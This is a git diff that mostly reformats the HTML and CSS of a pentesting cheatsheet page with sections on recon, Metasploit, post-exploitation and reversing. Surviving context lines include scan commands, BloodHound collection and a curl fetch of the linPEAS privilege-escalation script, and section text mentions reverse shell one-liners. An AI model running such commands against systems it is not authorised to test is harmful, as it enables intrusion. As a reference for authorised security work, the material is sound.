@@ -1,11 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hacker's Cheatsheet — Cybersecurity & Pentesting Quick Reference</title>
-    <meta name="description" content="Searchable command cheatsheet for reconnaissance, network scanning, vulnerability research, reverse engineering, and Linux security auditing. Free, private, and 100% client-side.">
-    <meta name="keywords" content="cybersecurity cheatsheet, pentesting commands, nmap, metasploit, recon tools, reverse engineering, linux security reference">
+    <meta name="description"
+        content="Searchable command cheatsheet for reconnaissance, network scanning, vulnerability research, reverse engineering, and Linux security auditing. Free, private, and 100% client-side.">
+    <meta name="keywords"
+        content="cybersecurity cheatsheet, pentesting commands, nmap, metasploit, recon tools, reverse engineering, linux security reference">
     <meta name="author" content="SmallTalk Apps">
     <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
     <link rel="canonical" href="https://hackerscheatsheet.onrender.com/">
@@ -14,7 +17,8 @@
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="Hacker's Cheatsheet">
     <meta property="og:title" content="Hacker's Cheatsheet — Cybersecurity & Pentesting Quick Reference">
-    <meta property="og:description" content="Searchable command reference for penetration testing, scanning, fuzzing, reversing, and defensive hardening. Single-file client-side manual.">
+    <meta property="og:description"
+        content="Searchable command reference for penetration testing, scanning, fuzzing, reversing, and defensive hardening. Single-file client-side manual.">
     <meta property="og:url" content="https://hackerscheatsheet.onrender.com/">
     <meta property="og:image" content="https://hackerscheatsheet.onrender.com/og-preview.png">
     <meta property="og:image:secure_url" content="https://hackerscheatsheet.onrender.com/og-preview.png">
@@ -26,7 +30,8 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:url" content="https://hackerscheatsheet.onrender.com/">
     <meta name="twitter:title" content="Hacker's Cheatsheet — Cybersecurity Quick Reference">
-    <meta name="twitter:description" content="Searchable command reference for penetration testing, scanning, fuzzing, and reverse engineering.">
+    <meta name="twitter:description"
+        content="Searchable command reference for penetration testing, scanning, fuzzing, and reverse engineering.">
     <meta name="twitter:image" content="https://hackerscheatsheet.onrender.com/og-preview.png">
 
     <!-- Schema.org JSON-LD -->
@@ -52,7 +57,9 @@
     <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;600;700&display=swap"
+        rel="stylesheet">
     <style>
         :root {
             --bg-color: #0A0A0A;
@@ -72,7 +79,8 @@
             padding: 0;
         }
 
-        html, body {
+        html,
+        body {
             overscroll-behavior-y: none;
         }
 
@@ -81,7 +89,7 @@
             color: var(--text-main);
             font-family: 'Inter', sans-serif;
             line-height: 1.6;
-            background-image: 
+            background-image:
                 linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                 linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
             background-size: 30px 30px;
@@ -89,10 +97,22 @@
         }
 
         /* Scrollbar */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: var(--bg-color); }
-        ::-webkit-scrollbar-thumb { background: var(--accent-green); border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #00cc33; }
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-color);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--accent-green);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00cc33;
+        }
 
         header {
             position: sticky;
@@ -198,7 +218,8 @@
             border-left: 2px solid transparent;
         }
 
-        .nav-link:hover, .nav-link.active {
+        .nav-link:hover,
+        .nav-link.active {
             background: rgba(0, 255, 65, 0.1);
             color: var(--accent-green);
             border-left: 2px solid var(--accent-green);
@@ -219,7 +240,7 @@
             align-items: flex-start;
             gap: 15px;
         }
-        
+
         .warning-banner h4 {
             color: var(--danger-red);
             margin-bottom: 0.5rem;
@@ -283,9 +304,18 @@
         }
 
         /* Simple Syntax Highlighting via CSS */
-        .comment { color: #676E95; font-style: italic; }
-        .command { color: #82AAFF; }
-        .arg { color: #C3E88D; }
+        .comment {
+            color: #676E95;
+            font-style: italic;
+        }
+
+        .command {
+            color: #82AAFF;
+        }
+
+        .arg {
+            color: #C3E88D;
+        }
 
         .copy-btn {
             position: absolute;
@@ -319,7 +349,7 @@
             color: var(--accent-green);
             transition: transform 0.3s ease;
         }
-        
+
         .section-card.collapsed .collapse-icon {
             transform: rotate(-90deg);
         }
@@ -332,33 +362,38 @@
             .container {
                 grid-template-columns: 1fr;
             }
+
             .sidebar {
                 display: none;
             }
         }
-        
+
         @media (max-width: 600px) {
             header {
                 flex-direction: column;
                 gap: 1rem;
             }
+
             .search-container {
                 width: 100%;
             }
         }
     </style>
 </head>
+
 <body>
 
     <header>
         <div class="logo">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
                 <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
             </svg>
             Hackers<span>Cheatsheet</span>
         </div>
         <div class="search-container">
-            <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <circle cx="11" cy="11" r="8"></circle>
                 <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
             </svg>
@@ -370,7 +405,7 @@
         <aside class="sidebar">
             <h3>Topics</h3>
             <ul class="nav-list" id="navList">
-                
+
                 <li class="nav-item">
                     <a href="#section-1" class="nav-link">1. Recon & OSINT</a>
                 </li>
@@ -456,33 +491,39 @@
 
         <main class="main-content" id="mainContent">
             <div class="warning-banner">
-                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;">
-                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z">
+                    </path>
                     <line x1="12" y1="9" x2="12" y2="13"></line>
                     <line x1="12" y1="17" x2="12.01" y2="17"></line>
                 </svg>
                 <div>
                     <h4>AUTHORIZED USE ONLY</h4>
-                    <p>Do not run these commands against systems you do not own or for which you do not have explicit written authorization from the asset owner. Misuse is illegal and unethical.</p>
+                    <p>Do not run these commands against systems you do not own or for which you do not have explicit
+                        written authorization from the asset owner. Misuse is illegal and unethical.</p>
                 </div>
             </div>
 
             <!-- Sections generated here -->
-            
+
             <div class="section-card" id="section-1">
                 <div class="section-header">
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">1.</span> Recon & OSINT
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Footprinting, WHOIS, DNS lookups, and passive certificate data gathering.</p>
+                    <p class="section-desc">Footprinting, WHOIS, DNS lookups, and passive certificate data gathering.
+                    </p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -516,17 +557,21 @@ shodan host 1.2.3.4
             <div class="section-card" id="section-2">
                 <div class="section-header">
                     <h2 class="section-title">
-                        <span style="color: var(--text-muted); margin-right: 8px;">2.</span> Recon: Search Engine Dorking & Exposed Assets
+                        <span style="color: var(--text-muted); margin-right: 8px;">2.</span> Recon: Search Engine
+                        Dorking & Exposed Assets
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Using advanced search operators (Dorks) to discover exposed files, directories, and misconfigurations.</p>
+                    <p class="section-desc">Using advanced search operators (Dorks) to discover exposed files,
+                        directories, and misconfigurations.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -558,15 +603,18 @@ intitle:"report" filetype:docx site:target.com
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">3.</span> SEO & Indexation Security
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Testing for misconfigurations in robots.txt, meta tags, and canonical URLs.</p>
+                    <p class="section-desc">Testing for misconfigurations in robots.txt, meta tags, and canonical URLs.
+                    </p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -593,7 +641,8 @@ site:example.com inurl:sessionid= OR inurl:PHPSESSID=
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">4.</span> Subdomain & DNS Enumeration
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
@@ -601,7 +650,8 @@ site:example.com inurl:sessionid= OR inurl:PHPSESSID=
                     <p class="section-desc">Discovering subdomains and advanced DNS records using specialized tools.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -625,7 +675,8 @@ dnsrecon -d example.com -t std,brt,srv
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">5.</span> Port & Service Discovery
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
@@ -633,7 +684,8 @@ dnsrecon -d example.com -t std,brt,srv
                     <p class="section-desc">Aggressive port scanning, service versioning, and banner grabbing.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -657,7 +709,8 @@ nc -vz 192.0.2.10 80
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">6.</span> Web Discovery & Fuzzing
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
@@ -665,7 +718,8 @@ nc -vz 192.0.2.10 80
                     <p class="section-desc">Bruteforcing directories, files, and virtual hosts.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -686,7 +740,8 @@ gobuster dir -u https://example.com/ -w /usr/share/wordlists/dirb/common.txt -t 
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">7.</span> Web Application Testing
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
@@ -694,7 +749,8 @@ gobuster dir -u https://example.com/ -w /usr/share/wordlists/dirb/common.txt -t 
                     <p class="section-desc">Quick vulnerability checks for common web flaws.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -719,17 +775,21 @@ arjun -u "https://example.com/page" -o arjun.txt
             <div class="section-card" id="section-8">
                 <div class="section-header">
                     <h2 class="section-title">
-                        <span style="color: var(--text-muted); margin-right: 8px;">8.</span> Vulnerability Scanning & SCA
+                        <span style="color: var(--text-muted); margin-right: 8px;">8.</span> Vulnerability Scanning &
+                        SCA
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Automated vulnerability template scanning, SBOM generation, and analysis.</p>
+                    <p class="section-desc">Automated vulnerability template scanning, SBOM generation, and analysis.
+                    </p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -754,17 +814,21 @@ curl -s "https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228" | jq .
             <div class="section-card" id="section-9">
                 <div class="section-header">
                     <h2 class="section-title">
-                        <span style="color: var(--text-muted); margin-right: 8px;">9.</span> Passwords, Credentials & AD Tooling
+                        <span style="color: var(--text-muted); margin-right: 8px;">9.</span> Passwords, Credentials & AD
+                        Tooling
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Online bruteforce (authorized only), offline hash cracking, and Active Directory enumeration.</p>
+                    <p class="section-desc">Online bruteforce (authorized only), offline hash cracking, and Active
+                        Directory enumeration.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -791,9 +855,11 @@ Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip
             <div class="section-card" id="section-10">
                 <div class="section-header">
                     <h2 class="section-title">
-                        <span style="color: var(--text-muted); margin-right: 8px;">10.</span> Exploitation: Metasploit Framework (MSF)
+                        <span style="color: var(--text-muted); margin-right: 8px;">10.</span> Exploitation: Metasploit
+                        Framework (MSF)
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
@@ -801,7 +867,8 @@ Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip
                     <p class="section-desc">Core MSF commands for searching, configuring, and executing exploits.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -836,17 +903,21 @@ exploit
             <div class="section-card" id="section-11">
                 <div class="section-header">
                     <h2 class="section-title">
-                        <span style="color: var(--text-muted); margin-right: 8px;">11.</span> Post-Exploitation: Shells & Enumeration
+                        <span style="color: var(--text-muted); margin-right: 8px;">11.</span> Post-Exploitation: Shells
+                        & Enumeration
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Listener commands, common reverse shell one-liners, and local privilege escalation.</p>
+                    <p class="section-desc">Listener commands, common reverse shell one-liners, and local privilege
+                        escalation.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -876,7 +947,8 @@ curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/li
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">12.</span> Network & TLS Checks
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
@@ -884,7 +956,8 @@ curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/li
                     <p class="section-desc">Traffic capture, packet analysis, and SSL/TLS configuration checks.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -909,17 +982,21 @@ sslyze --regular example.com:443
             <div class="section-card" id="section-13">
                 <div class="section-header">
                     <h2 class="section-title">
-                        <span style="color: var(--text-muted); margin-right: 8px;">13.</span> Vulnerability Research & PoC Triage
+                        <span style="color: var(--text-muted); margin-right: 8px;">13.</span> Vulnerability Research &
+                        PoC Triage
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Searching local exploit databases and safely running proof-of-concept code in isolation.</p>
+                    <p class="section-desc">Searching local exploit databases and safely running proof-of-concept code
+                        in isolation.</p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -942,17 +1019,21 @@ docker run --rm -v /tmp/poc.py:/poc/poc.py --network none -it python:3.10 bash -
             <div class="section-card" id="section-14">
                 <div class="section-header">
                     <h2 class="section-title">
-                        <span style="color: var(--text-muted); margin-right: 8px;">14.</span> Binary Reversing & Exploit Development
+                        <span style="color: var(--text-muted); margin-right: 8px;">14.</span> Binary Reversing & Exploit
+                        Development
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Static analysis (ELF), ROP gadget hunting, and interactive debugging setup.</p>
+                    <p class="section-desc">Static analysis (ELF), ROP gadget hunting, and interactive debugging setup.
+                    </p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -981,15 +1062,18 @@ gdb -q ./binary
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">15.</span> Fuzzing
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
                     </svg>
                 </div>
                 <div class="section-content">
-                    <p class="section-desc">Instrumented binary fuzzing and HTTP request fuzzing for input discovery.</p>
+                    <p class="section-desc">Instrumented binary fuzzing and HTTP request fuzzing for input discovery.
+                    </p>
                     <div class="code-container">
                         <button class="copy-btn">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                 <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                 <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                             </svg>
@@ -1010,15 +1094,18 @@ wfuzz -c -z file,/usr/share/wordlists/parameters.txt --hc 404 "https://example.c
                     <h2 class="section-title">
                         <span style="color: var(--text-muted); margin-right: 8px;">16.</span> Mobile & Firmware Analysis
                     </h2>
-                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="6 9 12 15 18 9"></polyline>
